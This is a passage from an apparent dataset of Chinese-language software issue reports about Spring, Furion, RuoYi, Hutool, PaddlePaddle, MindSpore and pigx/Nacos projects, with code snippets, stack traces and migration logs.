org.springframework.security.test.context.support.WithUserDetailsSecurityContextFactory.createSecurityContext(WithUserDetailsSecurityContextFactory.java:61) at org.springframework.security.test.context.support.WithUserDetailsSecurityContextFactory.createSecurityContext(WithUserDetailsSecurityContextFactory.java:44) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:123) ... 56 more   <code>: @Autowired private ProcessService processService; @Autowired private FilterChainProxy springSecurityFilterChain; private MockMvc mockMvc; // 模拟MVC对象，通过MockMvcBuilders.webAppContextSetup(this.wac).build()初始化。 @Autowired private WebApplicationContext wac; // 注入WebApplicationContext @Before // 在测试开始前初始化工作 public void setup() { this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).addFilter(springSecurityFilterChain) .apply(springSecurity()).build(); } @After void after() { } @Test @WithUserDetails(value = ""wuchang"",userDetailsServiceBeanName = ""mockUserService"") void saveStartPollutantProcess() { //PigxUser user = SecurityUtils.getUser(); processService.saveStartPollutantProcess(""1298924280482529282""); } at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:126) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.createTestSecurityContext(WithSecurityContextTestExecutionListener.java:96) at org.springframework.security.test.context.support.WithSecurityContextTestExecutionListener.beforeTestMethod(WithSecurityContextTestExecutionListener.java:62) at org.springframework.test.context.TestContextManager.beforeTestMethod(TestContextManager.java:289) at org.springframework.test.context.junit.jupiter.SpringExtension.beforeEach(SpringExtension.java:108) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeBeforeEachCallbacks$1(TestMethodTestDescriptor.java:161) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeBeforeMethodsOrCallbacksUntilExceptionOccurs$5(TestMethodTestDescriptor.java:197) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeBeforeMethodsOrCallbacksUntilExceptionOccurs(TestMethodTestDescriptor.java:197) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeBeforeEachCallbacks(TestMethodTestDescriptor.java:160) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:131) at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:71) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:135) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:38) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:38) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$5(NodeTestTask.java:139) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$7(NodeTestTask.java:125) at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:135) at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:123) at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:122) at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:80) at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:32) at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:51) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:248) at org.junit.platform.launcher.core.DefaultLauncher.lambda$execute$5(DefaultLauncher.java:211) at org.junit.platform.launcher.core.DefaultLauncher.withInterceptedStreams(DefaultLauncher.java:226) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:199) at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:132) at com.intellij.junit5.JUnit5IdeaTestRunner.startRunnerWithArgs(JUnit5IdeaTestRunner.java:71) at com.intellij.rt.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:33) at com.intellij.rt.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:220) at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:53) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at com.intellij.rt.execution.CommandLineWrapper.main(CommandLineWrapper.java:63)"
动态WebApi自定义参数位置无效,"Furion 版本号 2.13 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 发生了什么？ 动态WebApi自定义参数位置无效 代码或代码仓库 生成路由结果为：/messageNotification/messages Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos /messageNotification/{chatbotId}/messages   <code>: [HttpPost, AllowAnonymous, NonUnify, Route(""messageNotification/[action]"")] public string messages([FromBody] DXChatbot chatbot, [FromRoute,ApiSeat(ApiSeats.ActionStart)] string chatBotId) { _logger.LogInformation($""接收到Chatbot信息变更通知{JsonConvert.SerializeObject(chatbot)}""); return """"; } [HttpPost, AllowAnonymous, NonUnify, Route(""messageNotification/[action]"")] 更改为 [HttpPost, AllowAnonymous, NonUnify] 可以指定自定义参数位置"
「前端mock」关于本地调试页面，使用自己的mock 数据地址问题,"环境信息 pigx版本: 冷总，你好，我现在做本地开发，我想设置一个本地的axios-mock.js,单独配置自己的mock data（例如fastmock）的模拟数据，这样好调试前端，但是我设置了axios-mock.js里的 ,可是还是不管用呢，我看你的加密代码 cdn/axios.min.js 里的代码又访问了原来的那个axios.js的文件。 在自己的页面里，不能单独引用axios-mock.js吗？请指点下。   <code>: axios.baseURL=xxxxx"
升级 ry-ui.js 子页面传值给父页面 原失效,"你好，请教一下。 使用 RuoYi-fast 版本。 一个项目使用的ry-ui.js 未升级，子页面传值给父页面 正常使用。一个与发布版本保持一致。合并项目后 不能【正常传值】，麻烦指点一下，旧方法如何调整能和最新版兼容。 新增信息页面，打开用户页面，选中用户后，把用户ID、name 返回到 新增信息页面。 {field: 'name',title: '用户昵称'}, 请问如何调整能和最新版兼容。劳烦指点，谢谢。   <code>: &lt;script th:inline=""javascript""&gt; var prefix = ctx + ""course/courseInformation"" function selectCourseConfig() { var url=ctx+""course/courseInformation/openCourseConfig""; $.modal.open(""课程选择"",url); } &lt;/script&gt; function submitHandler() { var rows = $.table.selectFirstColumns(); if (rows.length !=1) { $.modal.alertWarning(""请选择一条记录""); return; } var datas=$(""#bootstrap-table"").bootstrapTable('getSelections'); var id=datas[0].id; var name=datas[0].name; var index = parent.layer.getFrameIndex(window.name); parent.$(""#userId"").val(id); //传入上个窗口对应的 id = ""id"" parent.$(""#userName"").val(name); //传入上个窗口对应的 name = ""name"" parent.layer.close(index); }"
定时任务异常,"场景:多个定时任务执行数据查询操作   <code>: /** * 定时任务调度测试 * * @author ruoyi */ @Component(""ryTask"") public class RyTask { @Autowired private ITfcLawpassService tfcLawpassService; public void ryMultipleParams(String s, Boolean b, Long l, Double d, Integer i) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""gcsj"", DateUtil.formatDateTime(DateUtil.beginOfDay(DateUtil.date()))); map.put(""reType"", 0); List&lt;TfcLawpass&gt; list = tfcLawpassService.selectTfcLawpassRenew(map); System.out.println(StringUtils.format(""执行多参方法： 字符串类型{}，布尔类型{}，长整型{}，浮点型{}，整形{}"", s, b, l, d, i)); } public void ryParams(String params) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""gcsj"", DateUtil.formatDateTime(DateUtil.beginOfDay(DateUtil.date()))); map.put(""reType"", 0); List&lt;TfcLawpass&gt; list = tfcLawpassService.selectTfcLawpassRenew(map); System.out.println(""执行有参方法："" + params); } public void ryNoParams() { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""gcsj"", DateUtil.formatDateTime(DateUtil.beginOfDay(DateUtil.date()))); map.put(""reType"", 0); List&lt;TfcLawpass&gt; list = tfcLawpassService.selectTfcLawpassRenew(map); System.out.println(""执行无参方法""); } public void ryMultipleParams1(String s, Boolean b, Long l, Double d, Integer i) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""gcsj"", DateUtil.formatDateTime(DateUtil.beginOfDay(DateUtil.date()))); map.put(""reType"", 0); List&lt;TfcLawpass&gt; list = tfcLawpassService.selectTfcLawpassRenew(map); System.out.println(StringUtils.format(""执行多参方法： 字符串类型{}，布尔类型{}，长整型{}，浮点型{}，整形{}"", s, b, l, d, i)); } public void ryParams1(String params) { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""gcsj"", DateUtil.formatDateTime(DateUtil.beginOfDay(DateUtil.date()))); map.put(""reType"", 0); List&lt;TfcLawpass&gt; list = tfcLawpassService.selectTfcLawpassRenew(map); System.out.println(""执行有参方法："" + params); } public void ryNoParams1() { Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(""gcsj"", DateUtil.formatDateTime(DateUtil.beginOfDay(DateUtil.date()))); map.put(""reType"", 0); List&lt;TfcLawpass&gt; list = tfcLawpassService.selectTfcLawpassRenew(map); System.out.println(""执行无参方法""); } }"
SqlConnRunner 访问数据库的时候每次都是生成druid连接池吗，开销大吗,"JDK版本： openjdk_8_201 hutool版本： 5.X.X 问题：您好 ，我project的工程里面，对数据库的所有交互用的都是query方法里面的代码（工程里面有好多好多），我想问一下，这样是每次都去生成一个连接池进行获得连接吗 ，我主要是怕对资源消耗太大了，不知道有没有这个问题，要是有怎么优化？   <code>: public static void query() { DruidDataSource ds = getDruidDataSource(); SqlConnRunner newSqlConnRunner = DbUtil.newSqlConnRunner(getDruidDataSource()); try { PageResult&lt;Entity&gt; result = newSqlConnRunner.page(ds.getConnection(), SqlBuilder.of(""select * from t_test""),new Page()); } catch (SQLException e) { e.printStackTrace(); } } public static DruidDataSource getDruidDataSource(){ DruidDataSource ds = new DruidDataSource(); ds.setUrl(""jdbc:mysql://localhost:3306/dbName""); ds.setUsername(""root""); ds.setPassword(""root""); return ds; }"
JsonUtil.toBean()方法，枚举序列化和反序列化异常,"JDK版本： openjdk_8_201 hutool版本： 5.8.10 String json = ""{\n"" + "" ""valueType"": ""LONG""\n"" + "" }""; Fields fields = JSONUtil.toBean(json, Fields.class); fields的valueType并不是预期的LONG类型的枚举 复现代码 @imash @AllArgsConstructor public enum BasicType { /** 字符串类型 */ STRING(String.class), /** 布尔类型 */ BOOLEAN(Boolean.class), /** 数值型 */ LONG(Long.class), /** 小数型 */ DECIMAL(BigDecimal.class); private final Class&lt;?&gt; type; @杨泽 public class Fields { } <ol start=""3"">   <code>: /** * 字段数据类型 */ private BasicType valueType;"
监控日志“返回结果”有循环引用造成序列化错误,"Furion 版本号 4.2.7 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 监控日志记录返回值出现序列化错误 发生了什么？ 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos JsonSerializerOptions建议增加以下代码： 类似： 里 解决返回结果套娃的问题 只有 才支持，当然，如果能把序列化拿出来在注册的 里最好。用户自定义，可以用 ，否则使用默认   <code>: ┣ 最终类型： Furion.UnifyResult.RESTfulResult`1[[System.Object, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]] ┣ 最终返回值： ""&lt;Error Serialize&gt;"" /// &lt;summary&gt; /// 序列化对象 /// &lt;/summary&gt; /// &lt;param name=""obj""&gt;&lt;/param&gt; /// &lt;returns&gt;&lt;/returns&gt; private static string SerializeObject(object obj) { var jsonSerializerOptions = new JsonSerializerOptions() { Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping }; try { return JsonSerializer.Serialize(obj, jsonSerializerOptions); } catch { return ""&lt;Error Serialize&gt;""; } } ReferenceHandler = ReferenceHandler.IgnoreCycles Newtonsoft.Json ReferenceLoopHandling.Ignore IgnoreCycles .NET6 options Newtonsoft.Json"
What should do to add MKLDNN kernel,"Base class that need to implement: derived from LoDTensor. in formal PaddlePaddle. Like MKLDNNMatrix.h for v2 derived from KernelBase. Like MKLDNNLayer.h in formal PaddlePaddle for v2 Tensor transform functions used to tranform between LodTensor and MKLDNNKernel Steps to add new kernel Take as example: add implement register kernel with library type If we want to add kernel, the step should be: add new file implement PoolMKLDNNOpKernel register PoolMKLDNNOpKernel with library   <code>: MKLDNNLoDTensor MKLDNNKernelBase pool_cudnn_op pool_cudnn_op.cu.cc PoolCUDNNOpKernel CUDNN REGISTER_OP_KERNEL(pool2d, CUDNN, ::paddle::platform::CUDAPlace, ops::PoolCUDNNOpKernel&lt;float&gt;, ops::PoolCUDNNOpKernel&lt;double&gt;); pool_mkldnn pool_mkldnn_op.cc MKLDNN REGISTER_OP_KERNEL(pool2d, MKLDNN, ::paddle::platform::MKLDNNPlace, ops::PoolMKLDNNOpKernel&lt;float&gt;, ops::PoolMKLDNNOpKernel&lt;double&gt;);"
How to represent sparse matrix in the new tensor library,"In paddle, sparse matrix are organized with CSR format. Since we decide to use to represent a tensor with specific in the new tensor library, we may use an union struct containing three array to represent sparse matrix. The two of them are , and the left one is .   <code>: Array Dim int float"
[ST][MS][modelzoo][facerecognition][gpu] facerecognition在gpu环境warning日志过多,"facerecognition在gpu环境warning日志过多 / 硬件环境: /device gpu : -- MindSpore version :master commit_id:cde09ee9 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_facerecognition_base_gpu_check_loss_8p_0003.py pytest -s test_ms_facerecognition_base_gpu_check_loss_8p_0003.py facerecognition在gpu环境warning日志ok 转给安正气   <code>: 16 mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:811] DetectFirstBatch] Bad performance attention, it waits more than 25 seconds and unable to fetch first Batch of data from dataset pipeline, which might result `GetNext` timeout problem. You may test dataset processing performance (with creating dataset iterator) and optimize it. Notes: shuffle operation is turn on for loading Dataset in default, which may effect first batch loading time. 14 mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:824] DetectPerBatchTime] Bad performance attention, it takes more than 25 seconds to fetch a batch of data from dataset pipeline, which might result `GetNext` timeout problem. You may test dataset processing performance(with creating dataset iterator) and optimize it."
Make ConvTransProjection support for dilation.,"We calculate output size of ConvTransProjection with origin filterH_ and filterW_, but not take into consideration dilation. It should be wrote as: And, outputSize and imageSize are not always reciprocal, so we should't use origin IMAGE_SIZE as ConvTransProjection output size while using output_x as input size.   <code>: imageH_ = imageSize(outputH_, (filterH_ - 1) * dilationH_ + 1, paddingH_, strideH_, /* caffeMode */ true);"
JbootAliyunmqImpl 设置地址访问不到,"启动的时候会提示 测试后发现将替换为   <code>: properties.put(PropertyKeyConst.ONSAddr, aliyunmqConfig.getAddr()); See http://docs.aliyun.com/cn#/pub/ons/faq/exceptions&amp;namesrv_not_exist for further details. com.aliyun.openservices.ons.api.exception.ONSClientException: Can not find name server with onsAddr http://*****.mq-internet-access.mq-internet.aliyuncs.com:80 See http://docs.aliyun.com/cn#/pub/ons/faq/exceptions&amp;namesrv_not_exist for further details. ONSAddr NAMESRV_ADDR"
安装1.6.4版本可能出现的问题。SQLSTATE[HY000] [2002] Connection refused (SQL: select * from information_schema.tables ,"安装的时候可能会出现以下报错： 解决办法： 进入3957ebc1fca4 kuaifan/wookteam:8.0 容器 回滚数据 再访问就可以了   <code>: 96 packages you are using are looking for funding. Use the `composer fund` command to find out more! Illuminate\Database\QueryException SQLSTATE[HY000] [2002] Connection refused (SQL: select * from information_schema.tables where table_schema = wookteam and table_name = pre_migrations and table_type = 'BASE TABLE') at vendor/laravel/framework/src/Illuminate/Database/Connection.php:692 688▕ // If an exception occurs when attempting to run a query, we'll format the error 689▕ // message to include the bindings with SQL, which will make this exception a 690▕ // lot more helpful to the developer instead of just the database's errors. 691▕ catch (Exception $e) { ? 692▕ throw new QueryException( 693▕ $query, $this-&gt;prepareBindings($bindings), $e 694▕ ); 695▕ } 696▕ } +36 vendor frames 37 artisan:37 Illuminate\Foundation\Console\Kernel::handle() Stopping wooktask-nginx-f9be60 ... done Stopping wooktask-php-f9be60 ... done Stopping wooktask-redis-f9be60 ... done Stopping wooktask-mariadb-f9be60 ... done Starting redis ... done Starting mariadb ... done Starting php ... done Starting nginx ... done docker exec -it 3957ebc1fca4 bash php artisan migrate:refresh --seed root@php:/var/www# php artisan migrate:refresh --seed WRolling back: 2021_02_19_000412_alter_pre_report_ccuser Rolled back: 2021_02_19_000412_alter_pre_report_ccuser (429.45ms) Rolling back: 2020_09_03_214217_alter_pre_docs_content Rolled back: 2020_09_03_214217_alter_pre_docs_content (447.77ms) Rolling back: 2020_09_03_214153_alter_pre_users_2 Rolled back: 2020_09_03_214153_alter_pre_users_2 (416.04ms) Rolling back: 2020_08_26_124253_create_project_content_table Rolled back: 2020_08_26_124253_create_project_content_table (206.62ms) Rolling back: 2020_08_20_141250_create_chat_files_table Rolled back: 2020_08_20_141250_create_chat_files_table (267.29ms) Rolling back: 2020_08_20_140853_alter_pre_users Rolled back: 2020_08_20_140853_alter_pre_users (489.38ms) Rolling back: 2020_07_25_164508_create_pre_umeng_table Rolled back: 2020_07_25_164508_create_pre_umeng_table (232.72ms) Rolling back: 2020_07_20_174941_alter_pre_docs_book_table_2 Rolled back: 2020_07_20_174941_alter_pre_docs_book_table_2 (481.49ms) Rolling back: 2020_07_16_175154_alter_pre_project_lists_table Rolled back: 2020_07_16_175154_alter_pre_project_lists_table (496.77ms) Rolling back: 2020_07_13_110335_alter_pre_docs_section_table Rolled back: 2020_07_13_110335_alter_pre_docs_section_table (984.20ms) Rolling back: 2020_07_13_105212_alter_pre_docs_book_table Rolled back: 2020_07_13_105212_alter_pre_docs_book_table (1,239.52ms) Rolling back: 2020_07_13_104810_create_pre_docs_users_table Rolled back: 2020_07_13_104810_create_pre_docs_users_table (205.86ms) Rolling back: 2020_06_08_175126_create_pre_ws_table Rolled back: 2020_06_08_175126_create_pre_ws_table (212.02ms) Rolling back: 2020_06_05_165357_create_pre_users_table Rolled back: 2020_06_05_165357_create_pre_users_table (202.01ms) Rolling back: 2020_06_05_165357_create_pre_setting_table Rolled back: 2020_06_05_165357_create_pre_setting_table (202.97ms) Rolling back: 2020_06_05_165357_create_pre_report_lists_table Rolled back: 2020_06_05_165357_create_pre_report_lists_table (201.74ms) Rolling back: 2020_06_05_165357_create_pre_report_content_table Rolled back: 2020_06_05_165357_create_pre_report_content_table (206.35ms) Rolling back: 2020_06_05_165357_create_pre_report_ccuser_table Rolled back: 2020_06_05_165357_create_pre_report_ccuser_table (206.67ms) Rolling back: 2020_06_05_165357_create_pre_project_users_table Rolled back: 2020_06_05_165357_create_pre_project_users_table (207.86ms) Rolling back: 2020_06_05_165357_create_pre_project_task_table Rolled back: 2020_06_05_165357_create_pre_project_task_table (207.93ms) Rolling back: 2020_06_05_165357_create_pre_project_log_table Rolled back: 2020_06_05_165357_create_pre_project_log_table (208.32ms) Rolling back: 2020_06_05_165357_create_pre_project_lists_table Rolled back: 2020_06_05_165357_create_pre_project_lists_table (240.80ms) Rolling back: 2020_06_05_165357_create_pre_project_label_table Rolled back: 2020_06_05_165357_create_pre_project_label_table (207.65ms) Rolling back: 2020_06_05_165357_create_pre_project_files_table Rolled back: 2020_06_05_165357_create_pre_project_files_table (208.33ms) Rolling back: 2020_06_05_165357_create_pre_docs_section_table Rolled back: 2020_06_05_165357_create_pre_docs_section_table (208.23ms) Rolling back: 2020_06_05_165357_create_pre_docs_content_table Rolled back: 2020_06_05_165357_create_pre_docs_content_table (207.08ms) Rolling back: 2020_06_05_165357_create_pre_docs_book_table Rolled back: 2020_06_05_165357_create_pre_docs_book_table (278.76ms) Rolling back: 2020_06_05_165357_create_pre_chat_msg_table Rolled back: 2020_06_05_165357_create_pre_chat_msg_table (206.06ms) Rolling back: 2020_06_05_165357_create_pre_chat_dialog_table Rolled back: 2020_06_05_165357_create_pre_chat_dialog_table (202.63ms) Migrating: 2020_06_05_165357_create_pre_chat_dialog_table Migrated: 2020_06_05_165357_create_pre_chat_dialog_table (1,825.09ms) Migrating: 2020_06_05_165357_create_pre_chat_msg_table Migrated: 2020_06_05_165357_create_pre_chat_msg_table (1,638.29ms) Migrating: 2020_06_05_165357_create_pre_docs_book_table Migrated: 2020_06_05_165357_create_pre_docs_book_table (366.79ms) Migrating: 2020_06_05_165357_create_pre_docs_content_table Migrated: 2020_06_05_165357_create_pre_docs_content_table (731.15ms) Migrating: 2020_06_05_165357_create_pre_docs_section_table Migrated: 2020_06_05_165357_create_pre_docs_section_table (259.04ms) Migrating: 2020_06_05_165357_create_pre_project_files_table Migrated: 2020_06_05_165357_create_pre_project_files_table (260.26ms) Migrating: 2020_06_05_165357_create_pre_project_label_table Migrated: 2020_06_05_165357_create_pre_project_label_table (255.94ms) Migrating: 2020_06_05_165357_create_pre_project_lists_table Migrated: 2020_06_05_165357_create_pre_project_lists_table (661.01ms) Migrating: 2020_06_05_165357_create_pre_project_log_table Migrated: 2020_06_05_165357_create_pre_project_log_table (253.10ms) Migrating: 2020_06_05_165357_create_pre_project_task_table Migrated: 2020_06_05_165357_create_pre_project_task_table (1,720.79ms) Migrating: 2020_06_05_165357_create_pre_project_users_table Migrated: 2020_06_05_165357_create_pre_project_users_table (2,368.82ms) Migrating: 2020_06_05_165357_create_pre_report_ccuser_table Migrated: 2020_06_05_165357_create_pre_report_ccuser_table (668.35ms) Migrating: 2020_06_05_165357_create_pre_report_content_table Migrated: 2020_06_05_165357_create_pre_report_content_table (661.19ms) Migrating: 2020_06_05_165357_create_pre_report_lists_table Migrated: 2020_06_05_165357_create_pre_report_lists_table (661.21ms) Migrating: 2020_06_05_165357_create_pre_setting_table Migrated: 2020_06_05_165357_create_pre_setting_table (660.51ms) Migrating: 2020_06_05_165357_create_pre_users_table Migrated: 2020_06_05_165357_create_pre_users_table (1,774.79ms) Migrating: 2020_06_08_175126_create_pre_ws_table Migrated: 2020_06_08_175126_create_pre_ws_table (1,423.02ms) Migrating: 2020_07_13_104810_create_pre_docs_users_table Migrated: 2020_07_13_104810_create_pre_docs_users_table (1,174.31ms) Migrating: 2020_07_13_105212_alter_pre_docs_book_table Migrated: 2020_07_13_105212_alter_pre_docs_book_table (1,389.67ms) Migrating: 2020_07_13_110335_alter_pre_docs_section_table Migrated: 2020_07_13_110335_alter_pre_docs_section_table (391.11ms) Migrating: 2020_07_16_175154_alter_pre_project_lists_table Migrated: 2020_07_16_175154_alter_pre_project_lists_table (409.38ms) Migrating: 2020_07_20_174941_alter_pre_docs_book_table_2 Migrated: 2020_07_20_174941_alter_pre_docs_book_table_2 (1,192.86ms) Migrating: 2020_07_25_164508_create_pre_umeng_table Migrated: 2020_07_25_164508_create_pre_umeng_table (1,606.19ms) Migrating: 2020_08_20_140853_alter_pre_users Migrated: 2020_08_20_140853_alter_pre_users (1,089.85ms) Migrating: 2020_08_20_141250_create_chat_files_table Migrated: 2020_08_20_141250_create_chat_files_table (279.84ms) Migrating: 2020_08_26_124253_create_project_content_table Migrated: 2020_08_26_124253_create_project_content_table (651.27ms) Migrating: 2020_09_03_214153_alter_pre_users_2 Migrated: 2020_09_03_214153_alter_pre_users_2 (456.69ms) Migrating: 2020_09_03_214217_alter_pre_docs_content Migrated: 2020_09_03_214217_alter_pre_docs_content (462.77ms) Migrating: 2021_02_19_000412_alter_pre_report_ccuser Migrated: 2021_02_19_000412_alter_pre_report_ccuser (413.27ms) Seeding: SettingTableSeeder Seeded: SettingTableSeeder (34.91ms) Seeding: UsersTableSeeder Seeded: UsersTableSeeder (35.39ms) Database seeding completed successfully."
more TensorArray background is needed in design,"is a new concept introduced to support dynamic models, the design document is simple to some extent, more details need to add.   <code>: TensorArray"
pigx-monitor启动报错：Registration类在进行反序列化的时候失败了,"环境信息 pigx版本: 4.0.0 是否修改包名: 已修改 提供详细 当启动pigx-monitor/PigxMonitorApplication后，不间断报 Registration类反序列化失败错误，错误描述如下： org.springframework.http.converter.HttpMessageConversionException: Type definition error: [simple type, class de.codecentric.boot.admin.server.domain.values.Registration]; nested exception is com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of (no Creators, like default constructor, exist): cannot deserialize from Object value (no delegate- or property-based Creator) 另外，访问localhost:5001后显示获取详情、日志等503错误，不知是否和上述错误有关   <code>: de.codecentric.boot.admin.server.domain.values.Registration"
Nacos启动报错：系统找不到指定的文件。,"pig版本:3.1.1 是否修改包名: 未作修改 日中报错信息：   <code>: D:\programSoftware\jdk1.8.0_211\bin\java.exe -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true ""-javaagent:D:\programSoftware\IntelliJ_IDEA 2020.1.1\lib\idea_rt.jar=4032:D:\programSoftware\IntelliJ_IDEA 2020.1.1\bin"" -Dfile.encoding=UTF-8 -classpath D:\programSoftware\jdk1.8.0_211\jre\lib\charsets.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\deploy.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\access-bridge-64.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\cldrdata.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\dnsns.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\jaccess.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\jfxrt.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\localedata.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\nashorn.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\sunec.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\sunjce_provider.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\sunmscapi.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\sunpkcs11.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\ext\zipfs.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\javaws.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\jce.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\jfr.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\jfxswt.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\jsse.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\management-agent.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\plugin.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\resources.jar;D:\programSoftware\jdk1.8.0_211\jre\lib\rt.jar;D:\learnspace\pig\pig-register\target\classes;D:\programSoftware\maven\repo\com\pig4cloud\nacos\nacos-config\2.0.0.RELEASE\nacos-config-2.0.0.RELEASE.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-web\2.4.4\spring-boot-starter-web-2.4.4.jar;D:\programSoftware\maven\repo\org\springframework\boot\spring-boot-starter-json\2.4.4\spring-boot-starter-json-2.4.4.jar;D:\programSoftware\maven\repo\com\fasterxml\jackson\datatype\jackson-datatype-jdk8\2.11.4\jackson-datatype-jdk8-2.11.4.jar;D:\programSoftware\maven\repo\com\fasterxml\jackson\module\jackson-module-parameter-names\2.11.4\jackson-module-parameter-names-2.11.4.jar;D:\programSoftware\maven\repo\org\springframework\spring-web\5.3.5\spring-web-5.3.5.jar;D:\programSoftware\maven\repo\org\springframework\spring-webmvc\5.3.5\